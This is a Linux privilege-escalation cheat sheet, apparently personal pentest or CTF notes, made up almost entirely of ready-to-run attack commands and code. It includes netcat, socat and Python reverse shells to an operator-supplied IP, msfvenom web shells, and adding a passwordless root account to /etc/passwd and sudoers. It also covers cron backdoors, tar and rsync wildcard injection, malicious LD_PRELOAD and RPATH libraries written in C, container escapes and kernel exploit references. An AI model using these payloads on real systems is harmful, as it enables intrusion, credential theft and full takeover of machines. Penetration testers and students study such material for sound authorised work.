## LINUX PRIVESC

### TRANSFERS & SHELLS

```bash
#curl / wget / SSH (Transfer)
curl [YOUR_SERVER]/file.sh -o /dev/shm/file.sh
wget [YOUR_SERVER]/file.sh -O /dev/shm/file.sh
scp [-i id_rsa] [victim_user]@[IP]:[PATH/TO/OUT-FILE] ./INPUT-FILE

#netcat / ELF (Shell)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [YOUR_IP] [PORT] >/tmp/f
lin32[64]shell [PORT] -> chmod 777 /tmp/[shell]

#PHP, ASP.NET, JSP, WAR, NodeJS (Web-Shell)
msfvenom -p php/reverse_php LHOST=tun0 LPORT=4444
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f aspx -o shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f war -o shell.war
msfvenom -p nodejs/shell_reverse_tcp LHOST=tun0 LPORT=4444
```

### RBASH / DOCKS / TTY 

```bash
#ELS - Escape limited shells
env						   # <- Escape binaries in PATH? Exportable PATH?
df && mount /dev/sda2 /mnt # <- Mount filesystem to a new location?
sudo -l
export -p

#EC - Escape Containers (multiple ways)
1) ls -la / && hostname # <-- if hostname looks random and .dockerenv is present -> you are in a container
ip link add dummy0 type dummy && ip link delete dummy0 # <-- If this runs, you are in a privileged container
fdisk -l
mount /dev/sda2 /tmp/mnt2 # <-- You now have root access to filesystem

2) Generate a SSH pair
transfer and run on the victim: LINUX/PRIVESC/escape.sh with pasted id_rsa.pub
login to the root user with your key

3) https://github.com/cdk-team/CDK/releases/tag/v1.0.6
nc -lvp 999 < cdk
cat < /dev/tcp/[YOU_IP]/999 > cdk && chmod a+x cdk
cdk evaluate --full

4) ifconfig # <-- if the container is unprivileged, pivot inside it

#TWP - Obtaining a TTY or SSH/Socat session -> Find writable dirs
python -c 'import pty;pty.spawn("/bin/bash");' 
SHELL=/bin/bash script -q /dev/null
CTRL-Z -> stty -a; stty raw -echo && stty -a; fg -> reset -> xterm -> stty rows 52 cols 237 -> export TERM=xterm

find / -type d -perm -o+w  -exec ls -al {} \; 2>/dev/null
```

### METHODOLOGY

```bash
#Password re-usage (also similar passwords) -> Login + other authentication protocols
su [user]
sudo su

#Hijackable tmux/screen sessions (Valentine HTB)
tmux ls + tmux attach -t [name]
screen-ls + screen-dr [name]

#-----------SDSS - System, Disks, SUDO, SUID/GSID-----------#
uname -a && env && export -p && cat /etc/*-release
LES.sh  #Probable+ exploits only
/bin/bash --version # < 4.4 or < 4.2-048

cat /etc/fstab && df -h && mount

sudo -u#-1 /bin/bash    <-- #Exploit the (ALL, !root) ALL permissions <= 1.28
sudo -l  # <-- sudoedit? snap(dirty sock)? fail2ban? git operations? custom binaries?
sudo --version  # <-- 1.[x < 8].x -- 1.8.1[x] -- 1.8.2[x < 8] -- 1.8.31 (CVE-2021-3156)

find / -type f -perm /4000 -o -perm /2000 2>/dev/null  #GTFOBins + Uncommon names: screen-4.5.0, Exim 4.84, dosbox, NfsEn, keybase, pkexec -> (CVE-2021-4034)

#-----------UG - Users and Groups-----------#
whoami && cat /etc/passwd | grep sh && ls -laR /home
id && cat /etc/group

#-----------CCS - CRON, CAP, SPYING-----------#
ls -lah /etc/cron* /var/spool/cron /etc/anacrontab
grep "CRON" /var/log/cron.log
systemctl list-timers -all

getcap -r / 2>/dev/null # <-- look for different than cap_net

pspy64 -pf -i 1000

#-----------PALN - Processes, Apps, Localhost services, Network-----------#
ps -ef | grep ^[user or root] # <-- SentryHD / tmux / SNMP / SMB / CUPS / SMTPD / davfs2 / httpd / splunkd / authbind / authenticator? config files writable? Vulnerable version? Can you redirect execution? GTFOBins? Credential Dumping?
dump.sh [PID]
strings *.dump

dpkg -l # <-- Or rpm -qa (Note down every suspicious package ex. apport, s-nail, policykit, CouchDB, keybases, Chkrootkit -> 33899)
apt-cache policy [name_of_package]

(netstat -punta || ss -4 -l -n ) | grep "127.0"
nc -lvnp [port] / nc localhost [port]

cat /etc/hostname /etc/hosts /etc/networks /etc/sysconfig/network /etc/resolv.conf /etc/ufw/user.rules
arp -e && ifconfig && route -n

#----------------------F - File Hunting----------------------#
#Interesting & dot files in common directories + directory name search
ls -laR /home /var/backups /var/log /var/mail /var/spool /mnt /srv
ls -la /opt
#motd.legal-displayed in /home/.cache -> try ssp -m 14339
#Encrypted files .enc -> 'netgp --decrypt [file.enc] > [file]'

locate [dir_name]/

#NFS Root-squash Escalation
mount -t nfs [IP]:[SHARE] /tmp/privesc
cp /bin/bash /tmp/privesc && chmod +x /tmp/privesc/bash
cd [Share_Folder] && ./bash -p

#Config folders/files related to every service (eg. /var/www/html, /srv/ftp, ... ) + inspect log files

#Writable configuration/service files + authorized_keys/id_rsa + permissions of passwd/shadow/opasswd
find / -type f -writable -path "/etc" -or -path "/opt" -exec ls -la {} \; 2>/dev/null
find / -type f -writable -name "*.service" -or -name "*.conf" -exec ls -la {} \; 2>/dev/null

find / -type f -name "id_rsa" -or -name "authorized_keys" -exec ls -la {} \; 2>/dev/null
ssh-keygen -> echo 'ssh-rsa [key] kali@kali' >> authorized_keys

ls -la /etc/shadow /etc/security/opasswd /etc/passwd

root2:UMPSKMmOsUnxQ:0:0:root:/root:/bin/bash # <-- /etc/passwd -> add the string
mkpasswd -m sha-512 pass123					 # <-- /etc/shadow -> Replace with root hash
[your-user] ALL=(ALL) NOPASSWD: ALL 		 # <-- /etc/sudoers or /etc/sudoers.d/README
* * * * * root [REV_SHELL_COMMAND]			 # <-- /etc/crontab

[program:memcached]
command = bash -c '[CMD]'	# <-- memcached.ini + root process that calls it (maybe /etc/super*.conf?)

miniserv.users # <- openssl passwd -1 'pass' + replace x + systemctl restart webmin = root:pass access
.bashrc        # <- Write CMD inside -> execution when user/root owner of file re-logs

#Web config file scraping + Applications in /opt 
find / -type f -name "*Controller*" -or -name "*settings*" -or -name "*config*" -or -name "*connect*" -or -name "*db*" -or -name "*sql*" -or -name "*database*" -or -name "*users*" -or -name "*pass*" -or -name "*default*" ! -path "/proc/*" ! -path "/sys/*" ! -path "/tmp/*" ! -path "/run/*" -exec ls -al {} \; 2>/dev/null

ls -la /opt

#World writable files + Owned files + String mining + Permission search
find / -perm -o+w -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/tmp/*" ! -path "/run/*" -exec ls -al {} \; 2>/dev/null

find / -user `whoami` 2>/dev/null
find / -group [your-group] 2>/dev/null

grep --color=auto -rnw '[path]' -ie "[word]" --color=always 2>/dev/null

find / [-user [user] -group [group]] -readable [-writable] -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/tmp/*" ! -path "/run/*" -exec ls -al {} \; 2>/dev/null

#Append permissions for files
lsattr [file] # <-- Check if -a flag is present
echo [something] >> [file]

#Configuration extensions
.inc .cfg .service .conf .db .MYD .cnf

#Credentials in memory and in binaries
strings /dev/mem -n10 | grep -i PASS   #Requires access to /dev/mem
strings [binary]

#LinEnum credential search
./LinEnum.sh -t -k password

#----------------------FD - Firewalls, Drivers----------------------#
firewall-cmd --list all && iptables -L
tcpdump -i [interface] port [PORT] -w capture.cap -v #pcap group, tcpdump

lsmod
modinfo [driver]
lpstat -a
```

### PRIVILEGED BINARIES

```bash
#SUID / SUDO / CRON / CAP / CUSTOM

#GTFOBins / Public privesc / Overwritable Binaries + Config files
#WILDCARDS -> tar / double wildcards / symlink abuse
#SETENV / PYTHONPATH / LD_PRELOAD / LD_LIBRARY_PATH
#PATH / PYTHON LIBRARY HIJACKING
#SHARED / RPATH INJECTIONS
#String mining / Execution flow / Source code / Decompilation

#--------------------------------------WILDCARD INJECTION--------------------------------#
#TAR
echo "chmod u+s /bin/bash" > exp.sh && echo "" > "--checkpoint-action=exec=bash exp.sh" && echo "" > "--checkpoint=1"

#RSYNC
echo "chmod u+s /bin/bash" > exp.sh && echo "" > "-e sh exp.sh"

#SYMLINKS
ln -s /etc/passwd [file_that_is_overwrited_by_root]

#------------------------------SETENV/PYTHONPATH ATTRIBUTES------------------------#
SETENV -> you can set enviromental variables during execution
sudo PYTHONPATH=/dev/shm [priv_binary]

#--------------------------------LD_PRELOAD-/-LIBRARY_PATH--------------------------------#
gcc -fPIC -shared -o malicious.so malicious.c -nostartfiles
sudo LD_PRELOAD=malicious.so [BINARY]

gcc -fPIC -shared -o /tmp/[malicious.so] /tmp/[malicious.c]
sudo LD_LIBRARY_PATH=/tmp [BINARY]

#--------------------------------PATH / PYTHON HIJACKING--------------------------------#
#Binary strings -> calls without absolute paths / controllable paths + IFS absolute path hijack
strings [binary]
export PATH=/tmp:$PATH

export IFS=/

#Check if cronjob PATH is hijackable

#Bash < 4.2-048 - If "strings" reveals a absolute path in a privileged binary
function [ABS_PATH/TO/BINARY]() { /bin/bash -p; }
export -f [ABS_PATH/TO/BINARY]

#Bash < 4.4 PS4 Abuse
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' [SUID BINARY]
/tmp/rootbash -p

#To exploit
ln -s /bin/bash /tmp/[name_of_called_binary]

#Python Library Hijacking
python -c 'import sys;prin(sys.path)' # Write permissions in the library path? What is the path order?
#Payload -> give same name of called library
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);

#--------------------------------SHARED / RPATH INJECTION--------------------------------#
#Shared Library Injection
strace [binary] 2>&1 | grep -i -E "open|access|no such file" #Look for -1 ENOENT in a writable directory
ldd [binary]
ltrace [full run of binary]  #Allows you to see the execution flow during runtime

gcc -shared -nostartfiles -fPIC pwn.c -o pwn.so
mv pwn.so /writable/directory/[NAME_OF_MISSING_OBJECT]

#RPath Injection
readelf -d [binary] | egrep "NEEDED|RPATH"   #Note down the needed library, check if you control RPATH
ldd [binary]   #Check the needed library name and its path
cp [path/to/needed/lib] [/path/to/rpath_variable]  #Copy the needed library in the rpath

#Generate evil library in rpath
gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic evil_library.c -o [path/to/rpath/]/needed_lib.so
```

### OLD KERNELS

```bash
#Generally speaking if kernel < 4.8.0 = probably vulnerable
Linux kernel 4.4.0-116
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) #45010
Linux Kernel <= 3.19.0-73.8	#DirtyCow 40847 (https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
							#echo 0 > /proc/sys/vm/dirty_writeback_centisecs
							#g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil	
Linux Kernel <= 2.6.36-rc8	#RDS 15285/14814
Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)	#Full Nelson 15704
Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)  #Mempodipper 18411

#Compiled Exploits
https://github.com/lucyoa/kernel-exploits
```

### GROUPS

```bash
#SUDO/ADMIN/WHEEL
cat /etc/sudoers
pkexec "/bin/sh"
sudo su

#PCAP (you can sniff traffic)
pspy #Try to enumerate running processes
tcpdump port [port] -n -i lo -A

#SHADOW
cat /etc/shadow

#DEBUG
[SYS_PTRACE Capabilities on gdb]
gdb -p [PID_OF_ROOT_PROC]
call (void)system("[CMD]")
quit

#FAIL2BAN
/etc/fail2ban/action.d/iptables-multiport.conf # <-- Write privilege here
[write "chmod u+s /bin/bash" in the actionban and actionunban strings]
[Trigger a ssh lockout with crackmapexec]

#DISK
df -h
debugfs [mountpoint for '/']
[you now can do everything as root]

#VIDEO
w
find / -group video 2>/dev/null
cat /dev/fb0 > /tmp/screen.data # <-- Analyze with gimp + RGB565 Big Endian Image type
cat /sys/class/graphics/fb0/virtual_size

#ROOT
find / -group root -perm -g=w 2>/dev/null

#DOCKER (Four methods)
docker image ls
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash

docker run -it --rm -v $pwd:/mnt bash
echo 'root2:UMPSKMmOsUnxQ:0:0:root:/root:/bin/bash' >> /mnt/etc/passwd

sudo docker image ls
[Use the malicious Dockerfile inside privesc folder]
sudo docker build -f /opt/Dockerfile /opt/

ls -la /var/run/docker.sock #Writable?
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh

#ADM (Can read the logs)
grep -R -e 'password' /var/log/

#AUTH (OpenBSD)
Write permission to /etc/skey and /var/db/yubikey

#LXD
#Create the tar.gz file
git clone https://github.com/saghul/lxd-alpine-builder.git && cd lxd-alpine-builder && ./build-alpine

#Transfer the tar.gz file on the victim's pc then
lxc image import ./[image_name] --alias myimage

lxc config device add newprofile mydevice disk source=/ path=/mnt/root recursive=true

lxc start newprofile
lxc exec newprofile /bin/sh (or /bin/bash)

#Alternatively
https://github.com/initstring/lxd_root
```

### MISC / MALICIOUS C FILES

```bash
#SOCAT FULL TTY SHELL
#Listener:
sudo socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[YOUR_IP]:4444

#authbind is running as root -> allows you to listen on a port as root -> authbind [command_that_opens_a_port]

#DUMP MEMORY SCRIPT (dump.sh [PID])
#!/bin/bash
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done

#---------------SPAWN A SUID SHELL FILE----------------------#
#include <unistd.h>
int main() {
	setuid(0);
	system("/bin/bash -p");
	return 0;
}

#----------------LD_PRELOAD MALICIOUS SHARED FILE---------------------#
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>

void _init(){
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}

#--------------LD_LIBRARY_PATH MALICIOUS SHARED FILE-----------------------#
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

#------------------RPATH EVIL_LIBRARY.C FILE---------------------#
#include<stdlib.h>
#define SHELL "/bin/sh"
int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)){
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## 
